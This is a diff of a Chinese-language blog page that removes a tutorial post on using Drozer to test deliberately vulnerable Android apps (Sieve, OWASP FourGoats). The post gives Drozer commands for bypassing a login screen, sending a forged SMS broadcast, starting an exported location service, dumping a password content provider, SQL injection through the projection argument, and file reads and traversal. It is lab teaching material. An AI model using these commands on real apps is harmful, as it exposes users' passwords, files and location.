-<td>获取程序启动的activity信息</td>
-</tr>
-<tr>
-<td>app.package.list</td>
-<td>手机已安装的程序包</td>
-</tr>
-<tr>
-<td>app.package.manifest</td>
-<td>获取程序manifest文件信息</td>
-</tr>
-<tr>
-<td>app.package.native</td>
-<td>列出Native libraries 信息</td>
-</tr>
-<tr>
-<td>app.package.shareduid</td>
-<td>查找拥有共同uid的包和他们所有的权限</td>
-</tr>
-<tr>
-<td>app.provider.columns</td>
-<td>展示content provider URI的各列</td>
-</tr>
-<tr>
-<td>app.provider.delete</td>
-<td>删除content provider URI的内容</td>
-</tr>
-<tr>
-<td>app.provider.download</td>
-<td>使用openInputStream读取指定uri的内容，并下载在电脑中</td>
-</tr>
-<tr>
-<td>app.provider.info	获取</td>
-<td>content providers信息</td>
-</tr>
-<tr>
-<td>app.provider.insert</td>
-<td>插入数据到content provider</td>
-</tr>
-<tr>
-<td>app.provider.query</td>
-<td>查询content provider 内容</td>
-</tr>
-<tr>
-<td>app.provider.read</td>
-<td>使用openInputStream读取指定uri的内容</td>
-</tr>
-<tr>
-<td>app.provider.update</td>
-<td>更新content provider的内容</td>
-</tr>
-<tr>
-<td>app.service.info</td>
-<td>获取services的信息</td>
-</tr>
-<tr>
-<td>app.service.send</td>
-<td>使用 Message攻击暴露的service，其service实现了handleMessage</td>
-</tr>
-<tr>
-<td>app.service.start</td>
-<td>开启服务</td>
-</tr>
-<tr>
-<td>app.service.stop</td>
-<td>停止服务</td>
-</tr>
-</tbody></table>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul>
-<li>本次的apk来自于<a target="_blank" rel="noopener" href="https://github.com/as0ler/Android-Examples/blob/master/sieve.apk">这里</a>，提前安装到模拟器上</li>
-<li>测试步骤来源<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfa92bab3a55">这里</a>，非常感谢此博客的分享</li>
-<li>查找包含<code>sieve</code>的包名</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list -f sieve</span><br><span class="line">com.mwr.example.sieve (Sieve)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看包名的信息，我们已经获得应用数据目录、apk的路径、UID、GID等信息。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.info -a  com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/user/0/com.mwr.example.sieve</span><br><span class="line">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class="line">  UID: 10039</span><br><span class="line">  GID: [3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>
-
-<h3 id="确定可攻击面"><a href="#确定可攻击面" class="headerlink" title="确定可攻击面"></a>确定可攻击面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  1 content providers exported</span><br><span class="line">  0 services exported</span><br><span class="line">    is debuggable</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-
-<h3 id="activity组件"><a href="#activity组件" class="headerlink" title="activity组件"></a>activity组件</h3><blockquote>
-<p>应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。</p>
-</blockquote>
-<ul>
-<li>通过上边的命令可以发现<code>activity</code>存在问题，我们查看下用<code>apktool d sieve.apk</code>反编译出的的安装包的<code>AndroidManifest.xml</code>文件，可看到将<code>activity</code>的<code>exported</code>设置为<code>true</code>。说明存在被导出的分险</li>
-</ul>
-<p><img src="/aposts/2b1c1b8c/image-20220407105213231.png" alt="image-20220407105213231"></p>
-<ul>
-<li>查看对外的activity组件信息</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dz&gt;  run app.activity.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.PWList</span><br><span class="line">    Permission: null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用<code>app.activity.start</code>进行漏洞测试</li>
-</ul>
-<blockquote>
-<p>越权漏洞–绕过登录界面导致可直接访问Your Passwords界面，说明存在越权漏洞</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220407104315393.png" alt="image-20220407104315393"></p>
-<h3 id="Broadcast组件"><a href="#Broadcast组件" class="headerlink" title="Broadcast组件"></a>Broadcast组件</h3><blockquote>
-<p>BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p>
-</blockquote>
-<ul>
-<li><p>本次演练的apk来自于<a target="_blank" rel="noopener" href="https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk">这里</a></p>
-</li>
-<li><p>下面使用<code>fourgoats.apk</code>测试<code>Broadcast</code>。查看<code>fourgoats</code>该APP的可攻击点，可以看到存在<code>broadcast</code>广播问题。</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br><span class="line">Attack Surface:</span><br><span class="line">  4 activities exported</span><br><span class="line">  1 broadcast receivers exported # 发现这里有一个广播可攻击</span><br><span class="line">  0 content providers exported</span><br><span class="line">  1 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>使用<code>app.activity.start</code>进行漏洞测试查看对外的<code>broadcas</code>t组件信息</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span><br><span class="line">Package: org.owasp.goatdroid.fourgoats</span><br><span class="line">  org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看反编译出(<code>apktool d goatdroid.apk</code>)的<code>AndroidManifest.xml</code>文件，可看到将<code>receiver</code>的<code>exported</code>设置未进行设置(由于存在了filter，默认属性为true)。说明存在越权问题，可发送恶意广播，伪造消息等等。</li>
-</ul>
-<p><img src="/aposts/2b1c1b8c/image-20220407111007905.png" alt="image-20220407111007905"></p>
-<blockquote>
-<p>当前broadcast Receiver 是否可以从当前应用外部获取Receiver message true，可以；false 不可以。如果为false ,当前broadcast Receiver 只能收到同一个应用或者拥有同一 user ID 应用发出广播。</p>
-<p>默认值根据当前 broadcast Receiver 是否包含intent filter来定。如果没有任何的filter的话意味着只有在被详细的描述了class name的情况下才会被唤起。这意味着当前Receiver只能在应用内部被使用（因为其它应用不知道这个类的存在。）在这种情况下，默认值是false。如果至少包含一个filter意味着当前broadcast Receiver 将会收到来自系统或者其它应用的广播，所以这个时候默认值是true。</p>
-<p>不只有这个属性可以指定broadcast Receiver 是否暴露给其它应用。你也可以使用permission来限制外部应用给他发送消息</p>
-<p>更多的<a target="_blank" rel="noopener" href="https://blog.csdn.net/watermusicyes/article/details/46460347">参考资料</a></p>
-</blockquote>
-<ul>
-<li>反编译查看源代码，发现需要两个参数<code>phoneNumber</code>和<code>message</code>。</li>
-</ul>
-<p><img src="/aposts/2b1c1b8c/image-20220408194905671.png" alt="image-20220408194905671"></p>
-<h4 id="漏洞利用-可发送恶意广播包"><a href="#漏洞利用-可发送恶意广播包" class="headerlink" title="漏洞利用-可发送恶意广播包"></a>漏洞利用-可发送恶意广播包</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message pwnd!</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408195320526.png" alt="image-20220408195320526"></p>
-<h4 id="漏洞利用，拒绝服务攻击检测"><a href="#漏洞利用，拒绝服务攻击检测" class="headerlink" title="漏洞利用，拒绝服务攻击检测"></a>漏洞利用，拒绝服务攻击检测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408195645407.png" alt="image-20220408195645407"></p>
-<h3 id="Services组件"><a href="#Services组件" class="headerlink" title="Services组件"></a>Services组件</h3><blockquote>
-<p>一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。</p>
-</blockquote>
-<blockquote>
-<p>然而，音乐重放这个功能并没有对应的activity，因为使用者当然会认为在导航到其它屏幕时音乐应该还在播放的。在这个例子中，媒体播放器这个activity 会使用Context.startService()来启动一个service，从而可以在后台保持音乐的播放。同时，系统也将保持这个service 一直执行，直到这个service 运行结束。</p>
-</blockquote>
-<blockquote>
-<p>另外，我们还可以通过使用Context.bindService()方法，连接到一个service 上（如果这个service 还没有运行将启动它）。当连接到一个service 之后，我们还可以service 提供的接口与它进行通讯。拿媒体播放器这个例子来说，我们还可以进行暂停、重播等操作。 intent-filter未将exported设置为false，默认是可以导出的。</p>
-</blockquote>
-<p><img src="/aposts/2b1c1b8c/image-20220408195931828.png" alt="image-20220408195931828"></p>
-<ul>
-<li><code>org.owasp.fourgoats.goatdroid.LocationService</code>服务被导出，不需要任何权限。所以这意味着任何与<code>FourGoats</code>应用程序安装在设备上的恶意应用程序可以访问设备的位置。</li>
-</ul>
-<h4 id="让我们尝试启动特定服务"><a href="#让我们尝试启动特定服务" class="headerlink" title="让我们尝试启动特定服务"></a>让我们尝试启动特定服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408200049130.png" alt="image-20220408200049130"></p>
-<ul>
-<li>查看services信息</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408200401332.png" alt="image-20220408200401332"></p>
-<ul>
-<li>启动相关服务</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>观察状态栏中的位置标志和GPS位置正在由FourGoats应用程序访问，<strong>这里我出现应用已停止的提示，贴人家攻击成功的图片</strong></li>
-</ul>
-<p><img src="/aposts/2b1c1b8c/image-20220408201610560.png" alt="image-20220408201610560"></p>
-<h3 id="Content组件"><a href="#Content组件" class="headerlink" title="Content组件"></a>Content组件</h3><blockquote>
-<p>android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p>
-</blockquote>
-<ul>
-<li>查看<code>fourgoats</code>该APP的可攻击点，可以看到存在<code>broadcast</code>广播问题。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408202246019.png" alt="image-20220408202246019"></p>
-<h4 id="信息泄露利用"><a href="#信息泄露利用" class="headerlink" title="信息泄露利用"></a>信息泄露利用</h4><ul>
-<li>扫描并获取Content Provider信息，并列出了可访问内容URI的列表和路径：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line"></span><br><span class="line">Accessible content URIs:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查询或修改数据库中的数据，发现存在数据泄露问题，访问uri可看到一些敏感信息，</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">| _id | service | username | password | email |</span><br></pre></td></tr></table></figure>
-
-<p>我本人查到的是空数据，因为这个apk我还使用，因此没有任何数据，贴一个<strong>其他博客有数据的图片</strong></p>
-<p><img src="/aposts/2b1c1b8c/image-20220408203718126.png" alt="image-20220408203718126"></p>
-<h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h4><p>同样content可能导致注入问题。使用以下语句进行测试发现报错，说明存在SQL注入漏洞，直接注入了*号，查询到数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection  &quot;*&quot;</span><br><span class="line">| _id | service | username | password | email |</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>列出所有表信息</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot; </span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408204237027.png" alt="image-20220408204237027"></p>
-<ul>
-<li><strong>同时也可以使用扫描功能对该app注入点位置进行扫描</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408204354777.png" alt="image-20220408204354777"></p>
-<ul>
-<li><strong>列出该app的表信息</strong></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408204508903.png" alt="image-20220408204508903"></p>
-<h4 id="底层文件操作"><a href="#底层文件操作" class="headerlink" title="底层文件操作"></a>底层文件操作</h4><ul>
-<li>文件读取</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts </span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408204701317.png" alt="image-20220408204701317"></p>
-<ul>
-<li>文件下载</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>文件下载没有执行成功，执行成功后应该回显以下内容：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/data/com.mwr.example.sieve/databases/database.db /home/user/database.db </span><br><span class="line">Written 24576 bytes</span><br></pre></td></tr></table></figure>
-
-<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><ul>
-<li>目录遍历漏洞</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
-
-<p><img src="/aposts/2b1c1b8c/image-20220408204953757.png" alt="image-20220408204953757"></p>
-<p>更多Drozer使用方法可参阅官方指南（英文）：**<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf"> Drozer 使用指南</a>**</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1905,7 +1574,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">165</span>
+          <span class="site-state-item-count">166</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1943,7 +1612,7 @@
     <!--<h3 class="widget-title">Tag Cloud</h3> -->
     <div id="myCanvasContainer" class="widget tagcloud">
         <canvas width="250" height="250" id="resCanvas" style="width=100%">
-            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWVS/" rel="tag">AWVS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burp-Site/" rel="tag">Burp Site</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a><span class="tag-list-count">15</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dependency-Check/" rel="tag">Dependency-Check</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/H5/" rel="tag">H5</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hadoop/" rel="tag">Hadoop</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hibernate/" rel="tag">Hibernate</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hive/" rel="tag">Hive</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/" rel="tag">Metasploit</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MyBatis/" rel="tag">MyBatis</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nessus/" rel="tag">Nessus</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sonic/" rel="tag">Sonic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/airtest/" rel="tag">airtest</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/" rel="tag">android性能测试</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/app%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="tag">app安全测试</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/aritest/" rel="tag">aritest</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/centos/" rel="tag">centos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chrome/" rel="tag">chrome</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/datax/" rel="tag">datax</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/drozer/" rel="tag">drozer</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fisco-bcos/" rel="tag">fisco-bcos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flink/" rel="tag">flink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gin/" rel="tag">gin</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/" rel="tag">go</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go-zero/" rel="tag">go-zero</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hive/" rel="tag">hive</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/httprunner/" rel="tag">httprunner</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a><span class="tag-list-count">22</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jmeter/" rel="tag">jmeter</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kafka/" rel="tag">kafka</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kail/" rel="tag">kail</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode/" rel="tag">leetcode</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/leetcode-%E6%95%B0%E7%BB%84/" rel="tag">leetcode-数组</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mitmproxy/" rel="tag">mitmproxy</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/" rel="tag">mongodb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/monkey/" rel="tag">monkey</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/orm/" rel="tag">orm</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pandas/" rel="tag">pandas</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pc%E8%87%AA%E5%8A%A8%E5%8C%96/" rel="tag">pc自动化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/playwright/" rel="tag">playwright</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pytest/" rel="tag">pytest</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">23</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/selenium/" rel="tag">selenium</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/spring/" rel="tag">spring</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/springboot/" rel="tag">springboot</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlite/" rel="tag">sqlite</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/" rel="tag">sqlmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tkinter/" rel="tag">tkinter</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vue/" rel="tag">vue</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vue3/" rel="tag">vue3</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">云服务器</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/" rel="tag">大数据</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" rel="tag">安全测试</a><span class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/" rel="tag">性能测试</a><span class="tag-list-count">17</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" 